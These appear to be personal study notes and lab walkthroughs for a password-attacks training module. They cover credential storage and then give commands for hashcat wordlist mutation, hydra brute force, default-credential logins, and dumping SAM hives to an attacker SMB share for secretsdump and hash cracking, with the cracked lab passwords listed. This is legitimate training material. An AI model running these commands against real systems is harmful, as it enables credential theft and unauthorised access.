# PW Attacks

## Theory

### Protection theory

* CIA triade (Confidentiality, Integrity, Availability)
* Authentication
  * sth you KNOW (credentials)
  * sth you HAVE (app like Google auth)
  * sth you ARE (biometrics)
* PW Statistics (US)&#x20;
  * [https://www.pandasecurity.com/en/mediacenter/password-statistics/](https://www.pandasecurity.com/en/mediacenter/password-statistics/)
  * 24% americans use PW: 12345678, password, qwertyqwerty
  * [https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf](https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf)
  * combination pet / child + address number
  * 33% use their pets / children
  * 22% own name



### Credential storage

* rockyou.txt

#### Linux

* /etc/shadow
*   hashes

    <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* /etc/passwd
*

    <figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>





#### Windows

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* LSASS
* SAM database
* NTDS
* C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\\

### John The Ripper

* \*1996
* Attack Methods (Dictionary, Brute-force, Rainbow table)

## Remote PW attacks

### Network services



#### Questions

Find the user for the **WinRM** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

* WinRM = Windows Remote Management
  * must be configured manually in Win10
  * \-p5985 (HTTP) -p5986 (HTTPS)



Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.



Find the user for the **RDP** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.



Find the user for the **SMB** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.



### Password Mutations

#### Questions

**Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.**

Create mutated password-list:

`hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`

Remove PWs shorter than 10 chars

`sed -ri '/^.{,9}$/d' mut_password.list`

Use only first 7000

`head -7000 mut_password.list`

Bruteforce FTP

`hydra -l sam -P ./mut_password.list ftp://<IP> -t 64`

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**Connect to SSH:**

`ssh sam@10.129.131.233`

`cd smb`

`cat flag.txt`

### PW Reuse / Default PWs

* Credential stuffing - using Hydra
* [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
*

    <figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

#### Questions

**Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer.**&#x20;

`ssh sam@10.129.131.233`

`mysql -u -p`

* \-u and -p can be found in given cheetsheat
  * [https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv](https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv)
  *

      <figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

`mysql -u superdba -p admin`

* works...

Answer: <mark style="color:green;">**superdba:admin**</mark>

## Win Local PW Attacks

### Attacking SAM

* Copying SAM Registry Hives (hklm/sam, hklm/system, khlm/security)
* Creating backups of Hives using reg.exe
  * `reg.exe save hklm/sam C:/sam.save`
* Creating a Share w smbserver.py
  * `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`
* Moving Hive copies to Share
  * `move sam.save \10.10.15.16\CompData`
* Dumping Hashes w Impackets secretsdump.py
  * `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
* Cracking hashes w Hashcat
  * `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`
* Remote Dumping & LSA Secrets
  * `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
  * `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

#### Questions

**Where is the SAM database located in the Windows registry? (Format: \*\*\*\*\*\*\*)**

<mark style="color:green;">**hklm\sam**</mark>

**Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.**

Remmina -> Connect using RDP to Win machine

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/zihuatanejo`

`move sam.save \\10.10.15.16\CompData`

`move security.save \\10.10.15.16\CompData`

`move system.save \\10.10.15.16\CompData`

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

* ![](<.gitbook/assets/image (36).png>)

`nano haskestocrack.txt`

* store the HTLM hashes (last strings) into the txt file...

`sudo hashcat -m 1000 hashestocrack.txt Desktop/rockyou.txt`

Administrator:mommy1

ITbackdoor:<mark style="color:green;">**matrix**</mark>

frontdesk:Password123

**Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)**

<mark style="color:green;">**frontdesk:Password123**</mark>

### Attacking LSASS

### Attacking AD & NTDS.dit

### Credential Hunting in Windows

## Linux Local PW Attacks

### Credential Hunting in linux

### Passwd, Shadow & Opasswd
